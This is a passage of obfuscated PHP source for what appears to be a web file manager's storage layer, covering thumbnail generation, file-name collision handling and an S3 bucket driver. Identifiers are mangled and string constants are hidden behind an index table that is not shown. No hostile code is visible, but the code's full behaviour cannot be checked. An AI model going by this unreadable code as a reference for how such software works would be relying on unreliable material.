$Ä²Ä‚×• = array(); $†ƒÒ×É… = $ÃÂ‰¼¯„ ? ltrim($this->getPathOuter($ÃÂ‰¼¯„), $Şòä­†[8]) : $Şòä­†[12]; $ñÃ¶Ù”Í = $Şòä­†[176] . $¡Õ­÷ç’ . $Şòä­†[177] . rtrim($†ƒÒ×É…, $Şòä­†[8]); if (is_null($¡Õ­÷ç’)) { $Ä²Ä‚×• = array(); return; } if (is_null($ÃÂ‰¼¯„)) { foreach ($Ä²Ä‚×• as $ñÃ¶Ù”Í => $³©¾²âû) { if (!strstr($ñÃ¶Ù”Í, $Şòä­†[176] . $¡Õ­÷ç’ . $Şòä­†[178])) { continue; } unset($Ä²Ä‚×•[$ñÃ¶Ù”Í]); } return; } if (!is_null($ºÈ’´óµ)) { $Ä²Ä‚×•[$ñÃ¶Ù”Í] = $ºÈ’´óµ; return; } $İı†ìÒ² = isset($Ä²Ä‚×•[$ñÃ¶Ù”Í]) ? $Ä²Ä‚×•[$ñÃ¶Ù”Í] : null; if (!is_null($İı†ìÒ²)) { return $İı†ìÒ²; } $İı†ìÒ² = $this->{$¡Õ­÷ç’}($ÃÂ‰¼¯„); $Ä²Ä‚×•[$ñÃ¶Ù”Í] = $İı†ìÒ²; return $İı†ìÒ²; } public function cacheMethodInfoSet($½Îè¿«, $Ö›ËÑı‰, $½ÒÖä = false) { $£—ñíâ¬ =& $_SERVER[ìïæ“œî]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($£—ñíâ¬[179], $½Îè¿«, $Ö›ËÑı‰); $this->cacheMethod($£—ñíâ¬[180], $½Îè¿«, $Ö›ËÑı‰ ? !1 : !0); if (is_array($½ÒÖä)) { $this->cacheMethod($£—ñíâ¬[181], $½Îè¿«, $½ÒÖä); } } public function fileOutImage($ÙãøÊĞ, $¿İÛŞš‘ = 250) { $©ÕºÓ·ı =& $_SERVER[ìïæ“œî]; set_timeout(); if (substr($ÙãøÊĞ, 0, 4) == $©ÕºÓ·ı[152]) { $this->fileOutLink($ÙãøÊĞ); } $Õ”Áˆ·¾ = $this->info($ÙãøÊĞ); $È±é¹Ôİ = !1; $›µ¡˜ßÆ = isset($GLOBALS[$©ÕºÓ·ı[182]]) ? $GLOBALS[$©ÕºÓ·ı[182]] : array(); if ($›µ¡˜ßÆ && $›µ¡˜ßÆ[$©ÕºÓ·ı[183]] == $Õ”Áˆ·¾[$©ÕºÓ·ı[87]]) { $Õ”Áˆ·¾ = $›µ¡˜ßÆ; $ÊøĞÃ¼ = $Õ”Áˆ·¾[$©ÕºÓ·ı[184]]; if ($ÊøĞÃ¼ && isset($ÊøĞÃ¼[$©ÕºÓ·ı[185]])) { if ($ÊøĞÃ¼[$©ÕºÓ·ı[185]] <= $¿İÛŞš‘ && $ÊøĞÃ¼[$©ÕºÓ·ı[186]] <= $¿İÛŞš‘) { $È±é¹Ôİ = !0; } } } if ($Õ”Áˆ·¾[$©ÕºÓ·ı[79]] <= 1024 * 50 || $È±é¹Ôİ || !function_exists($©ÕºÓ·ı[187]) || $Õ”Áˆ·¾[$©ÕºÓ·ı[169]] == $©ÕºÓ·ı[188]) { return $this->fileOut($ÙãøÊĞ, !1, $Õ”Áˆ·¾[$©ÕºÓ·ı[32]]); } $†Çœ·¸ = kodIO::hashPath($Õ”Áˆ·¾); $Äâ®ä = "\143\x6f\x76\145\x72\137{$†Çœ·¸}\137{$¿İÛŞš‘}\56\x70\x6e\147"; $¨»º“•­ = IO_PATH_SYSTEM_TEMP . $©ÕºÓ·ı[189]; $„¾¡Ã‚  = IO::infoFullSimple($¨»º“•­); $ÆæÏ‘“ = $„¾¡Ã‚  && is_array($„¾¡Ã‚ ) ? $„¾¡Ã‚ [$©ÕºÓ·ı[87]] : $©ÕºÓ·ı[12]; if (!$ÆæÏ‘“) { $ÆæÏ‘“ = IO::mkdir($¨»º“•­); } if ($Õ”Áˆ·¾[$©ÕºÓ·ı[190]] == $©ÕºÓ·ı[191] && isset($Õ”Áˆ·¾[$©ÕºÓ·ı[192]]) && $Õ”Áˆ·¾[$©ÕºÓ·ı[192]] == kodIO::sourceID($ÆæÏ‘“)) { $â«Ş¤‰” = $Õ”Áˆ·¾[$©ÕºÓ·ı[193]]; if ($¿İÛŞš‘ <= 500) { $®Á™¨¿× = preg_replace($©ÕºÓ·ı[194], $©ÕºÓ·ı[195], $Õ”Áˆ·¾[$©ÕºÓ·ı[32]]); $â«Ş¤‰” = IO::fileNameExist($ÆæÏ‘“, $®Á™¨¿×); } return IO::fileOut(KodIO::make($â«Ş¤‰”), !1, $Õ”Áˆ·¾[$©ÕºÓ·ı[32]]); } $øçÃªş = IO::fileNameExist($ÆæÏ‘“, $Äâ®ä); if ($øçÃªş) { return IO::fileOut(KodIO::make($øçÃªş), !1, $Õ”Áˆ·¾[$©ÕºÓ·ı[32]]); } if ($¿İÛŞš‘ > 1000) { $this->makeImageCover($ÆæÏ‘“, $ÙãøÊĞ, $Äâ®ä, $¿İÛŞš‘); $this->makeImageCover($ÆæÏ‘“, $ÙãøÊĞ, "\x63\x6f\166\145\x72\x5f{$†Çœ·¸}\137\x32\x35\60\56\160\156\x67", 250); $øçÃªş = IO::fileNameExist($ÆæÏ‘“, $Äâ®ä); if ($øçÃªş) { return IO::fileOut(KodIO::make($øçÃªş), !1, $Õ”Áˆ·¾[$©ÕºÓ·ı[32]]); } die; } $ß‰ş¨¯ = Cache::get($Äâ®ä); if ($ß‰ş¨¯ == $©ÕºÓ·ı[196] || $ß‰ş¨¯ == $©ÕºÓ·ı[197]) { echo $ß‰ş¨¯; die; } Cache::set($Äâ®ä, $©ÕºÓ·ı[197], 60); $®Š¸ÙªŞ = array($ÆæÏ‘“, $Õ”Áˆ·¾[$©ÕºÓ·ı[87]], $Äâ®ä, $¿İÛŞš‘); $»…©È© = $©ÕºÓ·ı[198] . $Õ”Áˆ·¾[$©ÕºÓ·ı[79]] . $©ÕºÓ·ı[199] . $Äâ®ä . $©ÕºÓ·ı[200] . $Õ”Áˆ·¾[$©ÕºÓ·ı[32]] . $©ÕºÓ·ı[201] . $Õ”Áˆ·¾[$©ÕºÓ·ı[87]]; TaskQueue::add($©ÕºÓ·ı[202], $®Š¸ÙªŞ, $»…©È©, $Äâ®ä); } public function makeImageCover($ºİéØ›ì, $‘Ãªİ¸É, $õ¼È¬­‰, $Ö‚„–ù) { $¯÷é© =& $_SERVER[ìïæ“œî]; if (IO::fileNameExist($ºİéØ›ì, $õ¼È¬­‰)) { return $¯÷é©[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Èè”è¸¿ = DATA_THUMB . $õ¼È¬­‰; del_file($Èè”è¸¿); $½­æ´ = TEMP_FILES . $õ¼È¬­‰; if (!@file_exists($½­æ´)) { $½­æ´ = $this->download($‘Ãªİ¸É, $½­æ´); } if (!@file_exists($½­æ´)) { return $¯÷é©[204]; } ImageThumb::createThumb($½­æ´, $Èè”è¸¿, $Ö‚„–ù, $Ö‚„–ù * 10); if (@file_exists($Èè”è¸¿)) { Cache::remove($õ¼È¬­‰); return IO::move($Èè”è¸¿, $ºİéØ›ì); } Cache::set($õ¼È¬­‰, $¯÷é©[196], 600); del_file($Èè”è¸¿); return $¯÷é©[205] . $½­æ´ . $¯÷é©[74]; } public function fileOutImageServer($—Ş˜ì¢Â, $ı¬§®°© = 250) { $this->fileOutImage($—Ş˜ì¢Â, $ı¬§®°©); } public function fileNameAuto($èÃ Êè, $İ––Ïñ, $˜¯Ø÷½ = REPEAT_RENAME, $¦ñ¬À¼… = false) { $ìï¨İ¬Ø =& $_SERVER[ìïæ“œî]; $ºúÍÁø = $èÃ Êè === $ìï¨İ¬Ø[12] ? $İ––Ïñ : rtrim($èÃ Êè, $ìï¨İ¬Ø[8]) . $ìï¨İ¬Ø[8] . $İ––Ïñ; if ($˜¯Ø÷½ == REPEAT_REPLACE || !$this->exist($ºúÍÁø) || $¦ñ¬À¼… && $˜¯Ø÷½ != REPEAT_RENAME_FOLDER) { return $İ––Ïñ; } if ($˜¯Ø÷½ == REPEAT_SKIP) { return !1; } $ºÆ•ÌÓ¯ = $ìï¨İ¬Ø[10] . get_path_ext($İ––Ïñ); $ºÆ•ÌÓ¯ = $ºÆ•ÌÓ¯ == $ìï¨İ¬Ø[10] || $¦ñ¬À¼… ? $ìï¨İ¬Ø[12] : $ºÆ•ÌÓ¯; $µÒåşì» = 1; $¬â²ÖæŠ = substr($İ––Ïñ, 0, strlen($İ––Ïñ) - strlen($ºÆ•ÌÓ¯)); $¾âí±œ = $¬â²ÖæŠ . "\50{$µÒåşì»}\x29{$ºÆ•ÌÓ¯}"; while ($this->exist(rtrim($èÃ Êè, $ìï¨İ¬Ø[8]) . $ìï¨İ¬Ø[8] . $¾âí±œ)) { $¾âí±œ = $¬â²ÖæŠ . "\x28{$µÒåşì»}\51{$ºÆ•ÌÓ¯}"; $µÒåşì»++; } return $¾âí±œ; } private function fileNameAutoList($«×ôş«Û, $ú½ë‘Ù, $â‰ƒ‹û = false) { $­íØü¼ =& $_SERVER[ìïæ“œî]; $½äëñúÁ = $this->listPath($«×ôş«Û, !0); $½äëñúÁ = array_merge($½äëñúÁ[$­íØü¼[85]], $½äëñúÁ[$­íØü¼[86]]); $’ñÁ¯½ü = array_to_keyvalue($½äëñúÁ, $­íØü¼[12], $­íØü¼[32]); $Øë²‹ë = $­íØü¼[10] . get_path_ext($ú½ë‘Ù); $Øë²‹ë = $Øë²‹ë == $­íØü¼[10] || $â‰ƒ‹û ? $­íØü¼[12] : $Øë²‹ë; $‚æĞè¬Ñ = substr($ú½ë‘Ù, 0, strlen($ú½ë‘Ù) - strlen($Øë²‹ë)); $……³´‚ = $‚æĞè¬Ñ . "\x28\60\51{$Øë²‹ë}"; for ($ó„åâü§ = 1; $ó„åâü§ <= count($’ñÁ¯½ü) + 1; $ó„åâü§++) { $……³´‚ = $‚æĞè¬Ñ . "\x28{$ó„åâü§}\51{$Øë²‹ë}"; if (!in_array_not_case($……³´‚, $’ñÁ¯½ü)) { return $……³´‚; } } return $……³´‚; } public function listAllFiles($ ’ûşÃê, $Ï¶õßı) { $½°ÀŠ³ş =& $_SERVER[ìïæ“œî]; if (empty($Ï¶õßı)) { return array(); } $úŠÃö½‚ = array_keys($Ï¶õßı); $—ñüÈ«œ = array(); $ ’ûşÃê = trim($ ’ûşÃê, $½°ÀŠ³ş[8]); foreach ($Ï¶õßı as $¿­€ó£± => $¤ÅÊËÇš) { $Ò¢‚ƒá = ltrim(substr(trim($¿­€ó£±, $½°ÀŠ³ş[8]), strlen($ ’ûşÃê)), $½°ÀŠ³ş[8]); if (substr($¿­€ó£±, -1) == $½°ÀŠ³ş[8]) { $Ò¢‚ƒá = rtrim($Ò¢‚ƒá, $½°ÀŠ³ş[8]) . $½°ÀŠ³ş[8]; } $—ñüÈ«œ = array_merge($—ñüÈ«œ, $this->slicePath($Ò¢‚ƒá)); } $ºó¬šÎ£ = array(); foreach (array_unique($—ñüÈ«œ) as $Ò•×§Ï‚) { $ˆ“±„«Ü = array($½°ÀŠ³ş[87] => $this->getPathOuter($½°ÀŠ³ş[8] . $ ’ûşÃê . $½°ÀŠ³ş[8] . $Ò•×§Ï‚), $½°ÀŠ³ş[78] => 1, $½°ÀŠ³ş[79] => 0); if (substr($Ò•×§Ï‚, -1) != $½°ÀŠ³ş[8]) { $ˆ“±„«Ü[$½°ÀŠ³ş[78]] = 0; $×µ°Å¾Ø = $this->getPath($ ’ûşÃê . $½°ÀŠ³ş[8] . $Ò•×§Ï‚); if (isset($Ï¶õßı[$×µ°Å¾Ø])) { $Î©çñß = $Ï¶õßı[$×µ°Å¾Ø]; if (isset($Î©çñß[$½°ÀŠ³ş[79]])) { $ˆ“±„«Ü[$½°ÀŠ³ş[79]] = intval($Î©çñß[$½°ÀŠ³ş[79]]); } if (isset($Î©çñß[$½°ÀŠ³ş[206]])) { $ˆ“±„«Ü[$½°ÀŠ³ş[88]] = intval($Î©çñß[$½°ÀŠ³ş[206]]); } } } $ºó¬šÎ£[] = $ˆ“±„«Ü; } return $ºó¬šÎ£; } public function slicePath($î‹äëËˆ) { $®ã½º =& $_SERVER[ìïæ“œî]; $¾®¥ç‹Ú = explode($®ã½º[8], trim($î‹äëËˆ, $®ã½º[8])); $³ˆİâ¶ = 0; do { ++$³ˆİâ¶; $…ù”å”¶[] = implode($®ã½º[8], array_slice($¾®¥ç‹Ú, 0, $³ˆİâ¶)) . $®ã½º[8]; } while ($³ˆİâ¶ < count($¾®¥ç‹Ú)); $…ù”å”¶[count($¾®¥ç‹Ú) - 1] = $î‹äëËˆ; return $…ù”å”¶; } public function getHost() { $…Ş²Èé¢ =& $_SERVER[ìïæ“œî]; $Á©Äà¹Ú = parse_url(trim($this->domain, $…Ş²Èé¢[8])); $ó¡ì×•ˆ = isset($Á©Äà¹Ú[$…Ş²Èé¢[207]]) ? $Á©Äà¹Ú[$…Ş²Èé¢[207]] : http_type(); $¦±ÎÀ¬Ã = isset($Á©Äà¹Ú[$…Ş²Èé¢[208]]) ? $Á©Äà¹Ú[$…Ş²Èé¢[208]] : $Á©Äà¹Ú[$…Ş²Èé¢[87]]; if (isset($Á©Äà¹Ú[$…Ş²Èé¢[209]])) { $¦±ÎÀ¬Ã .= $…Ş²Èé¢[4] . $Á©Äà¹Ú[$…Ş²Èé¢[209]]; } return $ó¡ì×•ˆ . $…Ş²Èé¢[210] . $¦±ÎÀ¬Ã; } public function pathEncode($æ‚”Øì›) { $ªƒı“Ó¹ =& $_SERVER[ìïæ“œî]; return str_replace($ªƒı“Ó¹[211], $ªƒı“Ó¹[8], rawurlencode($æ‚”Øì›)); } public function writeLog($ô¤¬õğÃ = '', $ë£ÎéëÒ = false) { $¹ª‡¸ò =& $_SERVER[ìïæ“œî]; $¼Ÿ´š„ = in_array(ACTION, array($¹ª‡¸ò[212], $¹ª‡¸ò[213])); if (!$¼Ÿ´š„ && !GLOBAL_DEBUG) { return; } $ğíÖ—á = $ô¤¬õğÃ; static $×¦ÓùÅÕ = null; if (!$×¦ÓùÅÕ) { $×¦ÓùÅÕ = strtoupper($this->getType()); } $ô¤¬õğÃ = $×¦ÓùÅÕ . $¹ª‡¸ò[214] . $ô¤¬õğÃ; if ($ë£ÎéëÒ) { $ÂÒ¶º = error_get_last(); if ($ÂÒ¶º) { $ô¤¬õğÃ = array($ô¤¬õğÃ, $ÂÒ¶º); } } write_log($ô¤¬õğÃ, $¹ª‡¸ò[215]); if ($¼Ÿ´š„) { throw new Exception($ğíÖ—á); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($½šöÊîş) { set_timeout(); require_once SDK_DIR . $_SERVER[ìïæ“œî][216]; parent::__construct(); $this->_init($½šöÊîş); } public function _init($øê÷ôÔ) { $€¹õ´ÇÜ =& $_SERVER[ìïæ“œî]; $this->config = $øê÷ôÔ; foreach ($øê÷ôÔ as $³“¨ÒòŸ => $®üØ€ß) { if (isset($this->{$³“¨ÒòŸ})) { $this->{$³“¨ÒòŸ} = $®üØ€ß; } } $this->endpoint = $øê÷ôÔ[$€¹õ´ÇÜ[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($€¹õ´ÇÜ[212], $€¹õ´ÇÜ[213]))) { $this->client->setExceptions(); } } public function setSignVersion($óş’£Û = "\x76\64") { $this->signVer = $óş’£Û; $this->client->setSignatureVersion($óş’£Û); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $”©àõç) { return null; } } public function isBucketCors() { $Ç—…È’Ä =& $_SERVER[ìïæ“œî]; $‘‚úıå¾ = $this->getBucketCors(); if (!$‘‚úıå¾ || !is_array($‘‚úıå¾)) { return !1; } if (!is_array($‘‚úıå¾[$Ç—…È’Ä[218]])) { $‘‚úıå¾[$Ç—…È’Ä[218]] = explode($Ç—…È’Ä[50], $‘‚úıå¾[$Ç—…È’Ä[218]]); } if ($‘‚úıå¾[$Ç—…È’Ä[219]] != $Ç—…È’Ä[220] || !in_array($Ç—…È’Ä[220], $‘‚úıå¾[$Ç—…È’Ä[218]])) { return !1; } $À›ºŸ†İ = array_map($Ç—…È’Ä[221], $‘‚úıå¾[$Ç—…È’Ä[222]]); if (!is_array($À›ºŸ†İ)) { $À›ºŸ†İ = array(); } $°²Î·Ì™ = array($Ç—…È’Ä[223], $Ç—…È’Ä[224], $Ç—…È’Ä[225], $Ç—…È’Ä[226], $Ç—…È’Ä[227]); $ªèİæĞ™ = array_diff($°²Î·Ì™, $À›ºŸ†İ); return empty($ªèİæĞ™); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($œ´—ôè’, $Ñ¼ù³Ê = '', $ó·½ûÍ° = REPEAT_RENAME) { $¾·ÎíÛ« = $this->setContent($œ´—ôè’, $Ñ¼ù³Ê); if ($¾·ÎíÛ« !== !1) { return $this->getPathOuter($œ´—ôè’); } return !1; } public function mkdir($¥ÏğŸ‘Ë, $‘ô¥¸‚Ï = REPEAT_SKIP) { $Ò£Ù°ı =& $_SERVER[ìïæ“œî]; if (empty($¥ÏğŸ‘Ë) && $¥ÏğŸ‘Ë !== $Ò£Ù°ı[228]) { return !1; } if ($‘ô¥¸‚Ï && $this->_isFolder($¥ÏğŸ‘Ë)) { return $this->getPathOuter($¥ÏğŸ‘Ë); } $ÆÉß¤ó§ = $this->setContent($¥ÏğŸ‘Ë, $Ò£Ù°ı[12], !0); if ($ÆÉß¤ó§ !== !1) { return $this->getPathOuter($¥ÏğŸ‘Ë); } return !1; } public function copyFile($Ç¼³¤üğ, $õ´¸–íï, $ü“¡¤ÓÀ = array()) { $·šñ£Ø° =& $_SERVER[ìïæ“œî]; $Æ‘÷º¢ = $this->objectMeta($Ç¼³¤üğ); if (!$Æ‘÷º¢) { return !1; } if ($Æ‘÷º¢[$·šñ£Ø°[79]] <= 1024 * 1024 * 200) { $ººÙé¦Ù = $this->client->copyObject($this->bucket, $Ç¼³¤üğ, $this->bucket, $õ´¸–íï, $·šñ£Ø°[229], $ü“¡¤ÓÀ); } else { $ººÙé¦Ù = $this->client->multiCopyObject($this->bucket, $Ç¼³¤üğ, $this->bucket, $õ´¸–íï, $ü“¡¤ÓÀ); } $ººÙé¦Ù = $ººÙé¦Ù ? $this->getPathOuter($õ´¸–íï) : !1; return $ººÙé¦Ù; } public function moveFile($ÈÚê§ò÷, $ğçÅÇĞİ) { if ($this->copyFile($ÈÚê§ò÷, $ğçÅÇĞİ)) { $this->delFile($ÈÚê§ò÷); return $this->getPathOuter($ğçÅÇĞİ); } return !1; } public function delFile($‘¤Æ¾ÑŒ) { return $this->client->deleteObject($this->bucket, $‘¤Æ¾ÑŒ); } public function delFolder($„¼ìü–¾) { $™“”»åË =& $_SERVER[ìïæ“œî]; if (!$this->exist($„¼ìü–¾)) { return !0; } $this->listItemCache = !1; $ç°¡Ê„ = $this->fileList($„¼ìü–¾); $this->listItemCache = !0; $ÛÜŞóö = trim($„¼ìü–¾, $™“”»åË[8]) . $™“”»åË[8]; if (!empty($„¼ìü–¾) && $„¼ìü–¾ !== $™“”»åË[228] && !in_array($ÛÜŞóö, $ç°¡Ê„[$™“”»åË[85]])) { $ç°¡Ê„[$™“”»åË[85]][] = $ÛÜŞóö; } $×°ó™Û  = $this->delByBatch($ç°¡Ê„[$™“”»åË[86]]); if (!$×°ó™Û ) { return !1; } $×°ó™Û  = $this->delByBatch($ç°¡Ê„[$™“”»åË[85]]); if (!$×°ó™Û ) { return !1; } return $this->delFile($ÛÜŞóö); } private function delByBatch($»–ªåßØ) { foreach (array_chunk($»–ªåßØ, 1000) as $õ¨­ª°Å) { $ÈœÒßë® = $this->client->deleteObjects($this->bucket, $õ¨­ª°Å); if (!$ÈœÒßë®) { return !1; } } return !0; } public function rename($Üà²áÀ, $ˆİşçğ) { return $this->renameObject($Üà²áÀ, $ˆİşçğ); } public function listPath($¿ëúšü, $îïëæÃ¼ = false) { $üŠçÅÖ¯ =& $_SERVER[ìïæ“œî]; $±“Â¹Ëœ = $this->fileList($¿ëúšü, $üŠçÅÖ¯[8], !0); foreach ($±“Â¹Ëœ[$üŠçÅÖ¯[85]] as $‹¸é÷Ûµ => $ìÌÎÆÙğ) { $±“Â¹Ëœ[$üŠçÅÖ¯[85]][$‹¸é÷Ûµ] = $this->folderInfo($ìÌÎÆÙğ, $îïëæÃ¼, $ìÌÎÆÙğ); } foreach ($±“Â¹Ëœ[$üŠçÅÖ¯[86]] as $‹¸é÷Ûµ => $ìÌÎÆÙğ) { $±“Â¹Ëœ[$üŠçÅÖ¯[86]][$‹¸é÷Ûµ] = $this->fileInfo($ìÌÎÆÙğ[$üŠçÅÖ¯[32]], $îïëæÃ¼, $ìÌÎÆÙğ); } return $±“Â¹Ëœ; } protected function infoChildren($å¹³Ò¿, &$šÌ’…ß») { $ÑøÇÖÚß =& $_SERVER[ìïæ“œî]; $¡¿¿Š = $this->fileList($å¹³Ò¿, $ÑøÇÖÚß[12], !0); $šÌ’…ß»[$ÑøÇÖÚß[81]] += count($¡¿¿Š[$ÑøÇÖÚß[85]]); $šÌ’…ß»[$ÑøÇÖÚß[80]] += count($¡¿¿Š[$ÑøÇÖÚß[86]]); foreach ($¡¿¿Š[$ÑøÇÖÚß[86]] as $ñ–ò°íï) { if (!$ñ–ò°íï || !$ñ–ò°íï[$ÑøÇÖÚß[79]]) { continue; } $šÌ’…ß»[$ÑøÇÖÚß[79]] += $ñ–ò°íï[$ÑøÇÖÚß[79]]; } } private function fileInfo($õŒãØ’, $Õ‚»ÓÎ = false, $‚ú¨°µ = array()) { $ Úãà– =& $_SERVER[ìïæ“œî]; $Ğ¯ûÅş = array($ Úãà–[32] => $this->pathThis($õŒãØ’), $ Úãà–[87] => $this->getPathOuter($õŒãØ’), $ Úãà–[33] => $ Úãà–[230], $ Úãà–[169] => $this->ext($õŒãØ’), $ Úãà–[79] => isset($‚ú¨°µ[$ Úãà–[79]]) ? $‚ú¨°µ[$ Úãà–[79]] : 0); if ($Õ‚»ÓÎ) { return $Ğ¯ûÅş; } $Ğ¯ûÅş[$ Úãà–[231]] = $Ğ¯ûÅş[$ Úãà–[88]] = 0; $Ğ¯ûÅş[$ Úãà–[232]] = $Ğ¯ûÅş[$ Úãà–[233]] = !0; if (empty($‚ú¨°µ)) { $‚ú¨°µ = $this->objectMeta($õŒãØ’); if (!$‚ú¨°µ) { return $Ğ¯ûÅş; } } if (isset($‚ú¨°µ[$ Úãà–[234]]) && $‚ú¨°µ[$ Úãà–[234]]) { $Ğ¯ûÅş[$ Úãà–[235]] = $‚ú¨°µ[$ Úãà–[234]]; } if (isset($‚ú¨°µ[$ Úãà–[206]])) { $Ğ¯ûÅş[$ Úãà–[88]] = $‚ú¨°µ[$ Úãà–[206]]; } if (isset($‚ú¨°µ[$ Úãà–[79]])) { $Ğ¯ûÅş[$ Úãà–[79]] = $‚ú¨°µ[$ Úãà–[79]]; } return $Ğ¯ûÅş; } private function folderInfo($å°™‹öú, $ØíÜóÄ½ = false, $ö ·ûş¯ = array()) { $§¹ò¶ç =& $_SERVER[ìïæ“œî]; $¨ØŒ÷Øê = array($§¹ò¶ç[32] => $this->pathThis($å°™‹öú), $§¹ò¶ç[87] => $this->getPathOuter($§¹ò¶ç[8] . $å°™‹öú), $§¹ò¶ç[33] => $§¹ò¶ç[78]); if ($ØíÜóÄ½) { return $¨ØŒ÷Øê; } $¨ØŒ÷Øê[$§¹ò¶ç[231]] = $¨ØŒ÷Øê[$§¹ò¶ç[88]] = 0; $¨ØŒ÷Øê[$§¹ò¶ç[232]] = $¨ØŒ÷Øê[$§¹ò¶ç[233]] = !0; if ($å°™‹öú == $§¹ò¶ç[12]) { return $¨ØŒ÷Øê; } if (empty($ö ·ûş¯)) { $ö ·ûş¯ = $this->objectMeta(trim($å°™‹öú, $§¹ò¶ç[8]) . $§¹ò¶ç[8]); } if (isset($ö ·ûş¯[$§¹ò¶ç[206]])) { $¨ØŒ÷Øê[$§¹ò¶ç[231]] = $ö ·ûş¯[$§¹ò¶ç[206]]; } return $¨ØŒ÷Øê; } private function fileList($æÈıÕÚÛ, $òÇñë—‰ = '', $éõõò¸× = 0) { $§œŞ–²ƒ =& $_SERVER[ìïæ“œî]; $í‡Ğ¬Ïù = rtrim($æÈıÕÚÛ, $§œŞ–²ƒ[8]) . $§œŞ–²ƒ[8]; $Åø§İ³ = $this->listObjs($í‡Ğ¬Ïù, null, null, $òÇñë—‰); if (!$Åø§İ³) { return array($§œŞ–²ƒ[85] => array(), $§œŞ–²ƒ[86] => array()); } $¸€åˆÇ¨ = $èÃëóû = array(); foreach ($Åø§İ³[$§œŞ–²ƒ[236]] as $ÑÆîåŞç) { $ì¼Ï”§î = $ÑÆîåŞç[$§œŞ–²ƒ[32]]; if ($ì¼Ï”§î == $í‡Ğ¬Ïù) { continue; } $Ó÷Ä›§£ = isset($ÑÆîåŞç[$§œŞ–²ƒ[79]]) ? $ÑÆîåŞç[$§œŞ–²ƒ[79]] : 0; $®ÒºÅÏñ = $Ó÷Ä›§£ == 0 && substr($ì¼Ï”§î, strlen($ì¼Ï”§î) - 1, 1) == $§œŞ–²ƒ[8] ? !0 : !1; $this->cacheMethodInfoSet($ì¼Ï”§î, $®ÒºÅÏñ, $ÑÆîåŞç); if ($®ÒºÅÏñ) { $¸€åˆÇ¨[] = $ì¼Ï”§î; continue; } $èÃëóû[] = $éõõò¸× ? $ÑÆîåŞç : $ì¼Ï”§î; } foreach ($Åø§İ³[$§œŞ–²ƒ[237]] as $ÑÆîåŞç) { $¸€åˆÇ¨[] = $ÑÆîåŞç[$§œŞ–²ƒ[32]]; $this->cacheMethodInfoSet($ÑÆîåŞç[$§œŞ–²ƒ[32]], !0); } $this->cacheMethodInfoSet($æÈıÕÚÛ, !0); return array($§œŞ–²ƒ[85] => $¸€åˆÇ¨, $§œŞ–²ƒ[86] => $èÃëóû); } private function listObjs($ãÕ÷¡°õ, $èâ«³©í = null, $äİ†Éü± = null, $·™ÃÍ¼ˆ = null) { $—°ÚıÅË =& $_SERVER[ìïæ“œî]; $ãÕ÷¡°õ = trim($ãÕ÷¡°õ, $—°ÚıÅË[8]); $§ä ªÚÀ = empty($ãÕ÷¡°õ) && $ãÕ÷¡°õ !== $—°ÚıÅË[228] ? $—°ÚıÅË[12] : $ãÕ÷¡°õ . $—°ÚıÅË[8]; return $this->client->getBucket($this->bucket, $§ä ªÚÀ, $èâ«³©í, $äİ†Éü±, $·™ÃÍ¼ˆ, !0); } public function has($¹ÇÂé„û, $ß×ó¼† = false, $·»»Áı = true) { $˜ÒÉš»½ =& $_SERVER[ìïæ“œî]; $¹ÇÂé„û = trim($¹ÇÂé„û, $˜ÒÉš»½[8]); $Ë”³£Ûè = empty($¹ÇÂé„û) && $¹ÇÂé„û !== $˜ÒÉš»½[228] ? $˜ÒÉš»½[12] : $¹ÇÂé„û . $˜ÒÉš»½[8]; $×“ËıáÇ = null; $³œŒÒ¤£ = 500; $Ô¾ë¯‡ = $˜ÒÉš»½[8]; $˜øû‡éª = $ÃéÇá‘ = array(); while (!0) { $­’üâÓ• = $this->listObjs($¹ÇÂé„û, $×“ËıáÇ, $³œŒÒ¤£, $Ô¾ë¯‡); if (!$­’üâÓ•) { break; } $×“ËıáÇ = $­’üâÓ•[$˜ÒÉš»½[238]]; $ìõ¸µ”¯ = $­’üâÓ•[$˜ÒÉš»½[236]]; $ŒõõÀÔò = $­’üâÓ•[$˜ÒÉš»½[237]]; if (empty($ìõ¸µ”¯) && empty($ŒõõÀÔò)) { break; } if (count($ìõ¸µ”¯) == 1 && $ìõ¸µ”¯[0][$˜ÒÉš»½[32]] == $Ë”³£Ûè) { break; } if ($ß×ó¼†) { if (count($ìõ¸µ”¯)) { $ìõ¸µ”¯ = array_column($ìõ¸µ”¯, $˜ÒÉš»½[32]); $˜øû‡éª = array_merge($˜øû‡éª, $ìõ¸µ”¯); } if (count($ŒõõÀÔò)) { $ŒõõÀÔò = array_column($ŒõõÀÔò, $˜ÒÉš»½[32]); $ÃéÇá‘ = array_merge($ÃéÇá‘, $ŒõõÀÔò); } if ($×“ËıáÇ === null) { break; } continue; } if ($·»»Áı) { if (!empty($ìõ¸µ”¯)) { if (count($ìõ¸µ”¯) > 1 || isset($ìõ¸µ”¯[0][$˜ÒÉš»½[32]]) && $ìõ¸µ”¯[0][$˜ÒÉš»½[32]] != $Ë”³£Ûè) { return !0; } } } else { if (!empty($ŒõõÀÔò)) { return !0; } } if ($×“ËıáÇ === null) { break; } } if ($ß×ó¼†) { $˜øû‡éª = array_diff($˜øû‡éª, array($Ë”³£Ûè)); $˜øû‡éª = count(array_unique($˜øû‡éª)); $ÃéÇá‘ = count(array_unique($ÃéÇá‘)); return array($˜ÒÉš»½[239] => $˜øû‡éª, $˜ÒÉš»½[240] => $ÃéÇá‘); } return !1; } public function listAll($ÁÉƒ†Ãƒ) { $ä«œØíï =& $_SERVER[ìïæ“œî]; $™ó†÷°¥ = $this->fileList($ÁÉƒ†Ãƒ, $ä«œØíï[12], !0); $ë¶Á¤ÀÉ = array_to_keyvalue($™ó†÷°¥[$ä«œØíï[86]], $ä«œØíï[32]); foreach ($™ó†÷°¥[$ä«œØíï[85]] as $ªÎ±İ¨÷) { if 